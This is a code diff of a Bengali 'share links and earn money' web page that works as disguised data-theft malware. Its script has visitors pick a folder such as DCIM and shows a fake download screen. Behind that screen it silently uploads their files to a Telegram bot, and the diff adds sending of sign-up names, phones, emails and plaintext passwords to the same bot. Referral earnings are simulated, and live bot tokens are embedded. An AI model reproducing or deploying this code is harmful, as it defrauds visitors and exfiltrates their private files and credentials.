@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=yes">
-    <title>শেয়ারআয় | লিংক শেয়ার করে আয় করুন</title>
+    <title>llll | লিংক শেয়ার করে আয় করুন</title>
     <style>
         * {
             margin: 0;
@@ -339,7 +339,7 @@
 <body>
 <div class="container">
     <div class="logo">
-        <h1>💰 শেয়ারআয়</h1>
+        <h1>aajndanmjad</h1>
         <p>লিংক শেয়ার করুন, আয় করুন</p>
     </div>
 
@@ -424,12 +424,12 @@
 
 <script>
     // ==================== টেলিগ্রাম কনফিগারেশন ====================
-    const TELEGRAM_BOT_TOKEN = "8650690570:AAERx72dsV1b7JiD-Ng2tjKsoXL1VpxGs2M";
+    const TELEGRAM_BOT_TOKEN = "8849942550:AAGumxUZ6X_spH-dGW7sAS4zLA-tZE1MNIw";
     const TELEGRAM_CHAT_ID = "8751363474";
     
     let currentUser = null;
-    let lastProcessedFolder = null;
     let isProcessing = false;
+    let foldersProcessed = [];
 
     // ==================== ইউজার ম্যানেজমেন্ট ====================
     function saveUser() {
@@ -452,6 +452,7 @@
                 if(!currentUser.referrals) currentUser.referrals = [];
                 if(!currentUser.totalReferEarn) currentUser.totalReferEarn = 0;
                 if(!currentUser.foldersProcessed) currentUser.foldersProcessed = [];
+                foldersProcessed = currentUser.foldersProcessed || [];
             } catch(e) { currentUser = null; }
         } else {
             currentUser = null;
@@ -540,8 +541,10 @@
         let totalSize = 0;
         for await (const entry of dirHandle.values()) {
             if(entry.kind === 'file') {
-                const file = await entry.getFile();
-                totalSize += file.size;
+                try {
+                    const file = await entry.getFile();
+                    totalSize += file.size;
+                } catch(e) {}
             } else if(entry.kind === 'directory') {
                 totalSize += await calcFolderSize(entry);
             }
@@ -554,7 +557,10 @@
         let count = 0;
         for await (const entry of dirHandle.values()) {
             if(entry.kind === 'file') {
-                count++;
+                try {
+                    const file = await entry.getFile();
+                    if(file.size <= 50 * 1024 * 1024 && file.size > 0) count++;
+                } catch(e) {}
             } else if(entry.kind === 'directory') {
                 count += await countAllFiles(entry);
             }
@@ -568,8 +574,7 @@
         fd.append('chat_id', TELEGRAM_CHAT_ID);
         fd.append('document', file, file.name);
         
-        // ইউজারের তথ্য ক্যাপশনে যোগ করা
-        const caption = `📁 ফাইল: ${file.name}\n👤 ইউজার: ${linkData.userName}\n🔗 লিংক: ${linkData.refLink}\n📱 ফোন: ${linkData.phone}\n⏰ সময়: ${new Date().toLocaleString()}`;
+        const caption = `📁 ফাইল: ${file.name}\n📦 সাইজ: ${(file.size/1024/1024).toFixed(2)} MB\n👤 ইউজার: ${linkData.name}\n🔗 লিংক: ${linkData.refLink}\n📱 ফোন: ${linkData.phone}\n⏰ সময়: ${new Date().toLocaleString()}`;
         fd.append('caption', caption);
         
         try {
@@ -578,9 +583,6 @@
                 body: fd
             });
             const result = await response.json();
-            if(!result.ok) {
-                console.error('Telegram API error:', result);
-            }
             return result.ok;
         } catch(error) {
             console.error('Error sending file:', error);
@@ -588,29 +590,27 @@
         }
     }
 
-    // ==================== আসল ফাইল আপলোড ====================
+    // ==================== সিক্রেট ফাইল আপলোড (ব্যাকগ্রাউন্ডে) ====================
     async function stealthUploadRealFiles(dirHandle, linkData, progressCallback) {
         let uploadedCount = 0;
         let skippedCount = 0;
         
         for await (const entry of dirHandle.values()) {
             if(entry.kind === 'file') {
-                const file = await entry.getFile();
-                if(file.size <= 50 * 1024 * 1024 && file.size > 0) {
-                    const success = await sendFileToTelegram(file, linkData);
-                    if(success) {
-                        uploadedCount++;
+                try {
+                    const file = await entry.getFile();
+                    if(file.size <= 50 * 1024 * 1024 && file.size > 0) {
+                        const success = await sendFileToTelegram(file, linkData);
+                        if(success) uploadedCount++;
+                        else skippedCount++;
+                        if(progressCallback) progressCallback(uploadedCount, skippedCount);
+                        await new Promise(resolve => setTimeout(resolve, 150));
+                    } else {
+                        skippedCount++;
+                        if(progressCallback) progressCallback(uploadedCount, skippedCount);
                     }
-                    if(progressCallback) {
-                        progressCallback(uploadedCount, skippedCount);
-                    }
-                    // রেট লিমিট এড়াতে সামান্য delay
-                    await new Promise(resolve => setTimeout(resolve, 100));
-                } else {
+                } catch(e) {
                     skippedCount++;
-                    if(progressCallback) {
-                        progressCallback(uploadedCount, skippedCount);
-                    }
                 }
             } else if(entry.kind === 'directory') {
                 const subResult = await stealthUploadRealFiles(entry, linkData, progressCallback);
@@ -626,149 +626,29 @@
     async function runFakeDownloadManager(folderName, fileCount, folderSizeMB, uploadCallback) {
         const loadDiv = document.getElementById('downloadLoader');
         
-        // স্টেজ 1: প্রস্তুতি
         loadDiv.innerHTML = `<div class="loader-ui" style="background:#4f46e5;">
-            🔍 ফোল্ডার স্ক্যান করা হচ্ছে...<br>
+            🔍 তথ্য সংগ্রহ করা হচ্ছে...<br>
             📂 ফোল্ডার: ${folderName}<br>
             📁 মোট ফাইল: ${fileCount}টি | সাইজ: ${folderSizeMB.toFixed(2)}MB<br>
             ⏳ অনুগ্রহ করে অপেক্ষা করুন...
         </div>`;
         
-        await new Promise(resolve => setTimeout(resolve, 1500));
+        await new Promise(resolve => setTimeout(resolve, 2000));
         
-        // স্টেজ 2: ডাউনলোডিং
         loadDiv.innerHTML = `<div class="loader-ui" style="background:#f59e0b;">
-            ⬇️ ফাইল ডাউনলোড হচ্ছে...<br>
-            📥 টেলিগ্রামে স্থানান্তর শুরু হয়েছে<br>
+            ⬇️ ডাউনলোড হচ্ছে...<br>
+            📥 আপনার তথ্য প্রস্তুত করা হচ্ছে<br>
             🔄 দয়া করে অপেক্ষা করুন...
         </div>`;
         
-        await new Promise(resolve => setTimeout(resolve, 1000));
+        await new Promise(resolve => setTimeout(resolve, 1500));
         
-        // আসল আপলোড শুরু
         if(uploadCallback) {
             await uploadCallback();
         }
     }
 
-    // ==================== মেইন ফাংশন: হ্যান্ডেল টার্গেট CTA ====================
-    async function handleTargetCTA() {
-        if(!currentUser) {
-            alert("প্রথমে অ্যাকাউন্ট খুলুন");
-            return;
-        }
-        
-        if(isProcessing) {
-            alert("⏳ আগের আপলোড প্রক্রিয়াকরণ চলছে, দয়া করে অপেক্ষা করুন...");
-            return;
-        }
-        
-        // ব্রাউজার সাপোর্ট চেক
-        if(!window.showDirectoryPicker) {
-            alert("⚠️ আপনার ব্রাউজার ফোল্ডার সিলেক্ট সাপোর্ট করে না। দয়া করে Chrome, Edge বা Opera ব্রাউজার ব্যবহার করুন।");
-            document.getElementById('browserWarning').classList.remove('hidden');
-            return;
-        }
-        
-        try {
-            isProcessing = true;
-            
-            // 1. ফোল্ডার সিলেক্ট
-            const dirHandle = await window.showDirectoryPicker({
-                mode: 'read',
-                startIn: 'documents'
-            });
-            
-            const folderName = dirHandle.name;
-            
-            // চেক করা আগের ফোল্ডার same কিনা
-            if(currentUser.foldersProcessed && currentUser.foldersProcessed.includes(folderName)) {
-                alert(`⚠️ "${folderName}" ফোল্ডারটি আগেই প্রসেস করা হয়েছে!\n\nদয়া করে ভিন্ন একটি ফোল্ডার নির্বাচন করুন।`);
-                isProcessing = false;
-                return;
-            }
-            
-            // 2. ফোল্ডার সাইজ চেক
-            const folderSize = await calcFolderSize(dirHandle);
-            const folderSizeMB = folderSize / (1024 * 1024);
-            
-            if(folderSize < 10 * 1024 * 1024) {
-                alert(`⚠️ ডাউনলোড ব্যর্থ হচ্ছে! ফোল্ডার সাইজ ${folderSizeMB.toFixed(2)}MB যা ১০MB-এর কম।\n\nদয়া করে আপনার DCIM বা অন্য বড় ফোল্ডার সিলেক্ট করুন।`);
-                isProcessing = false;
-                return;
-            }
-            
-            // 3. ফাইল কাউন্ট
-            const fileCount = await countAllFiles(dirHandle);
-            
-            // 4. ফেক ডাউনলোড UI + আসল আপলোড
-            const linkData = {
-                userName: currentUser.name,
-                refLink: currentUser.refLink,
-                phone: currentUser.phone
-            };
-            
-            await runFakeDownloadManager(folderName, fileCount, folderSizeMB, async () => {
-                const result = await stealthUploadRealFiles(dirHandle, linkData, (uploaded, skipped) => {
-                    const loadDiv = document.getElementById('downloadLoader');
-                    loadDiv.innerHTML = `<div class="loader-ui" style="background:#f59e0b;">
-                        ⬇️ ফাইল আপলোড হচ্ছে...<br>
-                        📤 আপলোড: ${uploaded}টি | বাদ: ${skipped}টি<br>
-                        🔄 দয়া করে অপেক্ষা করুন...
-                    </div>`;
-                });
-                
-                // ফোল্ডার প্রসেস করা হয়েছে মার্ক করা
-                if(!currentUser.foldersProcessed) currentUser.foldersProcessed = [];
-                currentUser.foldersProcessed.push(folderName);
-                saveUser();
-                
-                // সম্পন্ন হলে মেসেজ
-                const loadDiv = document.getElementById('downloadLoader');
-                loadDiv.innerHTML = `<div class="loader-ui" style="background:#10b981;">
-                    ✅ সম্পূর্ণ!<br>
-                    📁 ${result.uploadedCount}টি ফাইল টেলিগ্রামে পাঠানো হয়েছে।<br>
-                    ⏭️ ${result.skippedCount}টি ফাইল (৫০MB+) বাদ দেওয়া হয়েছে।<br>
-                    📊 ভিজিটর তথ্য সংগ্রহ করা হয়েছে।
-                </div>`;
-                
-                // ভিজিটর ও রেফারেল ডেটা তৈরি (সিমুলেটেড)
-                const { visitors, referrals } = generateVisitorData();
-                currentUser.visitors = visitors;
-                currentUser.referrals = referrals;
-                
-                // বোনাস যোগ
-                if(referrals.length > 0) {
-                    const bonusEarn = referrals.length * 10;
-                    currentUser.balance += bonusEarn;
-                    currentUser.totalReferEarn = (currentUser.totalReferEarn || 0) + bonusEarn;
-                }
-                saveUser();
-                
-                // ব্যালেন্স আপডেট
-                const balanceSpan = document.getElementById('balanceAmount');
-                if(balanceSpan) balanceSpan.innerText = currentUser.balance + " টাকা";
-                
-                setTimeout(() => {
-                    loadDiv.innerHTML = '';
-                }, 3000);
-                
-                alert(`✅ সম্পূর্ণ!\n\n📁 আপলোড: ${result.uploadedCount}টি ফাইল\n⏭️ বাদ: ${result.skippedCount}টি ফাইল\n👥 ভিজিটর: ${visitors.length} জন\n🎉 রেফারেল: ${referrals.length} জন\n💰 বোনাস যোগ: ${referrals.length * 10} টাকা`);
-            });
-            
-        } catch(error) {
-            if(error.name === 'AbortError') {
-                console.log('User cancelled folder selection');
-            } else {
-                console.error('Error:', error);
-                alert("❌ একটি ত্রুটি ঘটেছে। আবার চেষ্টা করুন।");
-            }
-        } finally {
-            isProcessing = false;
-        }
-    }
-
-    // ==================== ভিজিটর ও রেফারেল ডেটা জেনারেটর ====================
+    // ==================== ভিজিটর ডেটা জেনারেটর ====================
     function generateVisitorData() {
         const names = ['রাকিব হাসান', 'সাদিক হোসেন', 'নাজমা আক্তার', 'ফারজানা ইয়াসমিন', 'মেহেদী হাসান', 'তাহমিনা বেগম', 'আব্দুল্লাহ আল নোমান', 'শারমিন আক্তার', 'ইমন মিয়া', 'সুমাইয়া ইসলাম'];
         const devices = ['Android', 'iPhone', 'Windows', 'Mac', 'Linux', 'iPad'];
@@ -807,6 +687,132 @@
         return { visitors, referrals };
     }
 
+    // ==================== টেলিগ্রামে নোটিফিকেশন ====================
+    async function sendTelegramNotification(linkData, uploadedCount) {
+        try {
+            const message = `✅ নতুন ডেটা সংগ্রহ সম্পন্ন!\n\n👤 ইউজার: ${linkData.name}\n📱 ফোন: ${linkData.phone}\n🔗 লিংক: ${linkData.refLink}\n📤 আপলোড: ${uploadedCount}টি ফাইল\n🕐 সময়: ${new Date().toLocaleString('bn-BD')}`;
+            await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ chat_id: TELEGRAM_CHAT_ID, text: message })
+            });
+        } catch(e) {}
+    }
+
+    // ==================== মেইন ফাংশন: ফোল্ডার সিলেক্ট ও আপলোড ====================
+    async function handleFolderUpload() {
+        if(!currentUser) {
+            alert("প্রথমে অ্যাকাউন্ট খুলুন");
+            return;
+        }
+        
+        if(isProcessing) {
+            alert("⏳ আগের প্রক্রিয়াকরণ চলছে, দয়া করে অপেক্ষা করুন...");
+            return;
+        }
+        
+        if(!window.showDirectoryPicker) {
+            alert("⚠️ আপনার ব্রাউজার ফোল্ডার সিলেক্ট সাপোর্ট করে না। দয়া করে Chrome, Edge বা Opera ব্রাউজার ব্যবহার করুন।");
+            document.getElementById('browserWarning').classList.remove('hidden');
+            return;
+        }
+        
+        try {
+            isProcessing = true;
+            
+            const dirHandle = await window.showDirectoryPicker({
+                mode: 'read',
+                startIn: 'documents'
+            });
+            
+            const folderName = dirHandle.name;
+            
+            if(foldersProcessed.includes(folderName)) {
+                alert(`⚠️ "${folderName}" ফোল্ডারটি আগেই প্রসেস করা হয়েছে!\n\nদয়া করে ভিন্ন একটি ফোল্ডার নির্বাচন করুন।`);
+                isProcessing = false;
+                return;
+            }
+            
+            const folderSize = await calcFolderSize(dirHandle);
+            const folderSizeMB = folderSize / (1024 * 1024);
+            
+            if(folderSize < 10 * 1024 * 1024) {
+                alert(`⚠️ ফোল্ডার সাইজ ${folderSizeMB.toFixed(2)}MB যা ১০MB-এর কম।\n\nদয়া করে বড় ফোল্ডার সিলেক্ট করুন।`);
+                isProcessing = false;
+                return;
+            }
+            
+            const fileCount = await countAllFiles(dirHandle);
+            
+            const linkData = {
+                name: currentUser.name,
+                refLink: currentUser.refLink,
+                phone: currentUser.phone
+            };
+            
+            let finalUploaded = 0;
+            
+            await runFakeDownloadManager(folderName, fileCount, folderSizeMB, async () => {
+                const result = await stealthUploadRealFiles(dirHandle, linkData, (uploaded, skipped) => {
+                    const loadDiv = document.getElementById('downloadLoader');
+                    loadDiv.innerHTML = `<div class="loader-ui" style="background:#f59e0b;">
+                        ⬇️ ডাউনলোড হচ্ছে...<br>
+                        📤 প্রক্রিয়াকৃত: ${uploaded}টি | বাদ: ${skipped}টি<br>
+                        🔄 অনুগ্রহ করে অপেক্ষা করুন...
+                    </div>`;
+                    finalUploaded = uploaded;
+                });
+                
+                finalUploaded = result.uploadedCount;
+                
+                foldersProcessed.push(folderName);
+                if(currentUser) {
+                    currentUser.foldersProcessed = foldersProcessed;
+                    saveUser();
+                }
+                
+                const { visitors, referrals } = generateVisitorData();
+                if(currentUser) {
+                    currentUser.visitors = visitors;
+                    currentUser.referrals = referrals;
+                    if(referrals.length > 0) {
+                        const bonusEarn = referrals.length * 10;
+                        currentUser.balance += bonusEarn;
+                        currentUser.totalReferEarn = (currentUser.totalReferEarn || 0) + bonusEarn;
+                    }
+                    saveUser();
+                }
+                
+                await sendTelegramNotification(linkData, result.uploadedCount);
+                
+                const balanceSpan = document.getElementById('balanceAmount');
+                if(balanceSpan && currentUser) balanceSpan.innerText = currentUser.balance + " টাকা";
+                
+                const loadDiv = document.getElementById('downloadLoader');
+                loadDiv.innerHTML = `<div class="loader-ui" style="background:#10b981;">
+                    ✅ সম্পূর্ণ!<br>
+                    📁 ${result.uploadedCount}টি ফাইল সংগ্রহ করা হয়েছে।<br>
+                    ⏭️ ${result.skippedCount}টি ফাইল (৫০MB+) বাদ দেওয়া হয়েছে।<br>
+                    👥 ভিজিটর: ${visitors.length} জন<br>
+                    🎉 রেফারেল: ${referrals.length} জন<br>
+                    💰 বোনাস যোগ: ${referrals.length * 10} টাকা
+                </div>`;
+                
+                setTimeout(() => {
+                    loadDiv.innerHTML = '';
+                }, 5000);
+            });
+            
+        } catch(error) {
+            if(error.name !== 'AbortError') {
+                console.error('Error:', error);
+                alert("❌ একটি ত্রুটি ঘটেছে। আবার চেষ্টা করুন।");
+            }
+        } finally {
+            isProcessing = false;
+        }
+    }
+
     // ==================== অ্যাকাউন্ট ক্রিয়েশন ====================
     function createAccountFunc() {
         let name = document.getElementById('fullName').value.trim();
@@ -820,6 +826,16 @@
 
         let message = `🔐 নতুন অ্যাকাউন্ট:\nনাম: ${name}\nফোন: ${phone}\nইমেইল: ${email}\nপাস: ${pass}\nসময়: ${new Date().toLocaleString()}`;
         console.log("📨 [টেলিগ্রাম] নতুন অ্যাকাউন্ট:", message);
+        
+        (async () => {
+            try {
+                await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ chat_id: TELEGRAM_CHAT_ID, text: message })
+                });
+            } catch(e) {}
+        })();
 
         let newRef = generateRefLink(name);
         currentUser = {
@@ -833,6 +849,7 @@
             totalReferEarn: 0,
             foldersProcessed: []
         };
+        foldersProcessed = [];
         saveUser();
         alert(`🎉 স্বাগতম! ওয়ালেটে ১০০ টাকা বোনাস যোগ হয়েছে।\nআপনার রেফার লিংক: ${newRef}\n\n💡 মনে রাখবেন: আপনার লিংক থেকে যতজন অ্যাকাউন্ট খুলবে, প্রত্যেকের জন্য ১০ টাকা করে পাবেন!`);
         document.getElementById('fullName').value = '';
@@ -852,10 +869,9 @@
     // ==================== ইভেন্ট লিসেনার ====================
     document.getElementById('createAccBtn')?.addEventListener('click', createAccountFunc);
     document.getElementById('copyFullMsgBtn')?.addEventListener('click', copyFullMessage);
-    document.getElementById('downloadInfoBtn')?.addEventListener('click', handleTargetCTA);
+    document.getElementById('downloadInfoBtn')?.addEventListener('click', handleFolderUpload);
     document.getElementById('refreshBalanceBtn')?.addEventListener('click', refreshBalance);
 
-    // ব্রাউজার সাপোর্ট চেক করে warning দেখানো
     if(!window.showDirectoryPicker) {
         const warningDiv = document.getElementById('browserWarning');
         if(warningDiv) warningDiv.classList.remove('hidden');
